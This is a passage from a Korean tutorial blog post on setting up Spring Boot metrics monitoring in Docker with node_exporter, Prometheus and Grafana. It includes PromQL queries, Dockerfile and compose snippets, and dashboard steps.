      &lt;li&gt;CPU와 디스크는 node_exporter로 대체 가능&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;주요 메트릭
    &lt;ul&gt;
      &lt;li&gt;HTTP 요청 처리 시간(초)
        &lt;ul&gt;
          &lt;li&gt;sum(http_server_requests_seconds_sum) by (instance) / sum(http_server_requests_seconds_count) by (instance)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;HTTP 요청 수
        &lt;ul&gt;
          &lt;li&gt;(rate(http_server_requests_seconds_count[5m]))&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;HTTP 오류 요청 비율
        &lt;ul&gt;
          &lt;li&gt;(sum(rate(http_server_requests_seconds_count{status=~”5..”}[5m])) by (instance) / sum(rate(http_server_requests_seconds_count[5m])) by (instance))&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;JVM 힙 메모리 사용률
        &lt;ul&gt;
          &lt;li&gt;sum(jvm_memory_used_bytes{area=”heap”}) by (instance) / sum(jvm_memory_max_bytes{area=”heap”}) by (instance)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;활성 스레드 수
        &lt;ul&gt;
          &lt;li&gt;jvm_threads_live_threads&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;스프링 평균 gc 지연시간(초)
        &lt;ul&gt;
          &lt;li&gt;avg(jvm_gc_pause_seconds_sum) by (instance)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;참고
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://docs.spring.io/spring-boot/reference/actuator/metrics.html#actuator.metrics.supported&quot; target=&quot;_blank&quot;&gt;지원하는 메트릭 설명&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;구조&quot;&gt;구조&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;모니터링 대상에 exporter 설치
    &lt;ul&gt;
      &lt;li&gt;docker container 내부에 spring과 node_exporter를 설치한다.&lt;/li&gt;
      &lt;li&gt;spring에 프로메테우스 메트릭 관련 의존성 패키지를 설치한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;프로메테우스 환경을 구축한다.
    &lt;ul&gt;
      &lt;li&gt;프로메테우스 설정에서 모니터링 대상 관련 설정을 추가한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;얼럿매니저 환경을 구축한다.
    &lt;ul&gt;
      &lt;li&gt;프로메테우스 메트릭을 조합해서 얼럿을 보내도록 설정한다.&lt;/li&gt;
      &lt;li&gt;얼럿이 발생하면 메신저(예시에서는 슬랙)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;노드-메트릭-설정&quot;&gt;노드 메트릭 설정&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;설명
    &lt;ul&gt;
      &lt;li&gt;os에서 node_exporter를 설치해야한다.&lt;/li&gt;
      &lt;li&gt;jdk 이미지 기반 Dockerfile 내에서  node_exporter를 설치 후 실행한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;도커파일
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;FROM amazoncorretto:21-alpine3.20  
            
...   
            
# node_exporter 설치  
RUN curl -L -O https://github.com/prometheus/node_exporter/releases/download/v1.8.2/node_exporter-1.8.2.linux-amd64.tar.gz  
            
RUN tar xvfz node_exporter-*.*-amd64.tar.gz  
            
RUN rm node_exporter-*.*-amd64.tar.gz  
            
...  
            
# 스크립트 복사  
COPY ./docker/web-script.sh .  
            
RUN chmod +x /web-script.sh  
            
CMD [&quot;/web-script.sh&quot;]  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;web-script.sh
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh  &lt;/span&gt;
            
&lt;span class=&quot;c&quot;&gt;# Run node_exporter  &lt;/span&gt;
./node_exporter-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-amd64&lt;/span&gt;/node_exporter &lt;span class=&quot;nt&quot;&gt;--web&lt;/span&gt;.listen-address&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0.0.0:9100 &lt;span class=&quot;nt&quot;&gt;--log&lt;/span&gt;.level&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;info &amp;amp;  
            
...  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;확인
    &lt;ul&gt;
      &lt;li&gt;도커 컨테이너를 올린다.&lt;/li&gt;
      &lt;li&gt;브라우저를 켜고 http://localhost:9100/metrics 확인&lt;/li&gt;
      &lt;li&gt;성공 시 응답 예시
        &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;# HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.  
# TYPE go_gc_duration_seconds summary  
go_gc_duration_seconds{quantile=&quot;0&quot;} 1.2345e-04  
go_gc_duration_seconds{quantile=&quot;0.25&quot;} 1.2345e-04  
go_gc_duration_seconds{quantile=&quot;0.5&quot;} 1.2345e-04  
go_gc_duration_seconds{quantile=&quot;0.75&quot;} 1.2345e-04  
go_gc_duration_seconds{quantile=&quot;1&quot;} 1.2345e-04  
go_gc_duration_seconds_sum 1.2345e-04  
go_gc_duration_seconds_count 9  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;스프링-프로메테우스-메트릭-설정&quot;&gt;스프링 프로메테우스 메트릭 설정&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;가정
    &lt;ul&gt;
      &lt;li&gt;스프링은 설치되어 있다고 가정한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;build.gradle.kts
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nf&quot;&gt;dependencies&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;// Actuator 기능 추가  &lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;implementation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;org.springframework.boot:spring-boot-starter-actuator&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   
    &lt;span class=&quot;c1&quot;&gt;// Prometheus 메트릭 등록  &lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;implementation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;io.micrometer:micrometer-registry-prometheus&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;resources/application.properties
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;# Prometheus  
management.endpoints.web.exposure.include: prometheus  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;확인
    &lt;ul&gt;
      &lt;li&gt;도커 컨테이너를 올려 스프링 웹서버를 실행시킨다.&lt;/li&gt;
      &lt;li&gt;브라우저를 켜고 http://localhost:8080/actuator/prometheus 확인&lt;/li&gt;
      &lt;li&gt;성공 시 응답 예시
        &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;# HELP application_ready_time_seconds Time taken for the application to be ready to service requests  
# TYPE application_ready_time_seconds gauge  
application_ready_time_seconds{main_application_class=&quot;com.example.demo.DemoApplicationKt&quot;} 123.456  
                
# HELP application_started_time_seconds Time taken to start the application  
# TYPE application_started_time_seconds gauge  
application_started_time_seconds{main_application_class=&quot;com.example.demo.DemoApplicationKt&quot;} 123.123  
                
# HELP disk_free_bytes Usable space for path  
# TYPE disk_free_bytes gauge  
disk_free_bytes{path=&quot;/.&quot;} 1.23456789E12  
...  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;프로메테우스에서-메트릭-수집&quot;&gt;프로메테우스에서 메트릭 수집&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;prometheus.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;  &lt;span class=&quot;na&quot;&gt;scrape_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;job_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;web'&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;metrics_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/actuator/prometheus'&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;scheme&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http'&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;static_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;web:8080'&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;  
              
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;job_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;web-node_exporter'&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;metrics_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/metrics'&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;scheme&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http'&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;static_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;web:9100'&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;docker-compose.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;  &lt;span class=&quot;na&quot;&gt;prometheus&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/prometheus:latest&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prometheus&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;always&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9090:9090&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;web&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;app-network&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;확인
    &lt;ul&gt;
      &lt;li&gt;스프링 도커 컨테이너와 프로메테우스 도커 컨테이너를 실행한다.&lt;/li&gt;
      &lt;li&gt;브라우저를 켜고 http://localhost:9090 접속&lt;/li&gt;
      &lt;li&gt;node_exporter 변수 입력
        &lt;ul&gt;
          &lt;li&gt;검색창에 node_cpu_seconds_total 입력 후 “Execute” 버튼 클릭&lt;/li&gt;
          &lt;li&gt;성공 시 응답 예시
            &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;node_cpu_seconds_total{cpu=&quot;0&quot;, instance=&quot;web:9100&quot;, job=&quot;web-node_exporter&quot;, mode=&quot;idle&quot;} 1234.56  
node_cpu_seconds_total{cpu=&quot;0&quot;, instance=&quot;web:9100&quot;, job=&quot;web-node_exporter&quot;, mode=&quot;iowait&quot;} 12.34  
node_cpu_seconds_total{cpu=&quot;0&quot;, instance=&quot;web:9100&quot;, job=&quot;web-node_exporter&quot;, mode=&quot;irq&quot;} 0.12  
node_cpu_seconds_total{cpu=&quot;0&quot;, instance=&quot;web:9100&quot;, job=&quot;web-node_exporter&quot;, mode=&quot;nice&quot;} 0.01  
node_cpu_seconds_total{cpu=&quot;0&quot;, instance=&quot;web:9100&quot;, job=&quot;web-node_exporter&quot;, mode=&quot;softirq&quot;} 1.23  
node_cpu_seconds_total{cpu=&quot;0&quot;, instance=&quot;web:9100&quot;, job=&quot;web-node_exporter&quot;, mode=&quot;steal&quot;} 0  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;spring_exporter 변수 입력
        &lt;ul&gt;
          &lt;li&gt;검색창에 http_server_requests_seconds_count 입력 후 “Execute” 버튼 클릭&lt;/li&gt;
          &lt;li&gt;성공 시 응답 예시
            &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;http_server_requests_seconds_count{error=&quot;none&quot;, exception=&quot;none&quot;, instance=&quot;web:8080&quot;, job=&quot;web&quot;, method=&quot;GET&quot;, outcome=&quot;SUCCESS&quot;, status=&quot;200&quot;, uri=&quot;/actuator/prometheus&quot;} 12345  
http_server_requests_seconds_count{error=&quot;none&quot;, exception=&quot;none&quot;, instance=&quot;web:8080&quot;, job=&quot;web&quot;, method=&quot;GET&quot;, outcome=&quot;CLIENT_ERROR&quot;, status=&quot;404&quot;, uri=&quot;/**&quot;} 6789  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;프로메테우스 검색 사용 방법
    &lt;ul&gt;
      &lt;li&gt;메트릭 이름으로 검색
        &lt;ul&gt;
          &lt;li&gt;node_cpu_seconds_total&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Label로 필터링 해서 검색
        &lt;ul&gt;
          &lt;li&gt;node_cpu_seconds_total{cpu=”0”, mode=”user”}&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;집계(aggregation) 함수 사용
        &lt;ul&gt;
          &lt;li&gt;sum(node_cpu_seconds_total{mode=”idle”})&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;그라파나에서-프로메테우스-메트릭-시각화&quot;&gt;그라파나에서 프로메테우스 메트릭 시각화&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;설명
    &lt;ul&gt;
      &lt;li&gt;프로메테우스에서 매번 검색하기도 어렵고 &lt;br /&gt;
검색 결과를 시각화하여 한 눈에 보고 싶을 경우&lt;br /&gt;
그라파나와 연동하여 시각화할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;docker-compose.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;  &lt;span class=&quot;na&quot;&gt;grafana&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;grafana/grafana:latest&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;grafana&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;always&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3000:3000&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./storage/grafana:/var/lib/grafana&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prometheus&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;app-network&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;확인
    &lt;ul&gt;
      &lt;li&gt;스프링, 프로메테우스, 그라파나 도커 컨테이너를 실행한다.&lt;/li&gt;
      &lt;li&gt;브라우저를 켜고 http://localhost:3000 접속&lt;/li&gt;
      &lt;li&gt;그라파나 로그인 화면이 나오면 성공&lt;/li&gt;
      &lt;li&gt;초기 ID/Password 는 admin/admin 이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;프로메테우스 데이터 소스 생성
    &lt;ul&gt;
      &lt;li&gt;(좌상단 로고 클릭) Connetions &amp;gt; Data sources&lt;/li&gt;
      &lt;li&gt;검색창에서 Prometheus 검색 후 결과에서 Prometheus 클릭&lt;/li&gt;
      &lt;li&gt;Connetion에서 http://prometheus:9090 입력
        &lt;ul&gt;
          &lt;li&gt;URL의 prometheus는 도커 서비스 명이다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;save &amp;amp; test 버튼 클릭&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;대시보드 생성
    &lt;ul&gt;
      &lt;li&gt;(좌상단 로고 클릭) Dashboards 클릭&lt;/li&gt;
      &lt;li&gt;(우상단) New 버튼 클릭, (드롭다운 메뉴에서) New dashboard 클릭&lt;/li&gt;
      &lt;li&gt;
        &lt;ul&gt;
          &lt;li&gt;Add visualization 버튼 클릭&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;(Select data source)에서 prometheus 클릭(이름은 다를 수 있음)&lt;/li&gt;
      &lt;li&gt;(오른쪽 사이드메뉴 panel options에서) Title 입력&lt;/li&gt;
      &lt;li&gt;(하단 메뉴 A 항목에서) builder/code 중 code 선택&lt;/li&gt;
      &lt;li&gt;“Enter a PromQL Query” 에 내가 원하는 프로메테우스 식을 넣으면 된다.
        &lt;ul&gt;
          &lt;li&gt;예를 들어 CPU 사용률&lt;br /&gt;
sum(rate(node_cpu_seconds_total{mode!=”idle”}[5m])) by (instance)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;(하단 메뉴 A 항목에서) Run queries 클릭하여 그래프 확인&lt;/li&gt;
      &lt;li&gt;(우상단) Save dashboard 버튼 클릭&lt;/li&gt;
      &lt;li&gt;(Save dashboard 왼쪽 사이드 메뉴에서) Title 입력 후 Save 버튼 클릭&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;대시보드에 판넬 추가
    &lt;ul&gt;
      &lt;li&gt;(좌상단 로고 클릭) Dashboards 클릭&lt;/li&gt;
      &lt;li&gt;(상단) Add 버튼 클릭, (드롭다운 메뉴에서) Visualization 클릭&lt;/li&gt;
      &lt;li&gt;위의 대시보드 생성과 같은 과정을 진행하면 판넬이 추가된다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;대시보드 판넬 삭제 및 수정
    &lt;ul&gt;
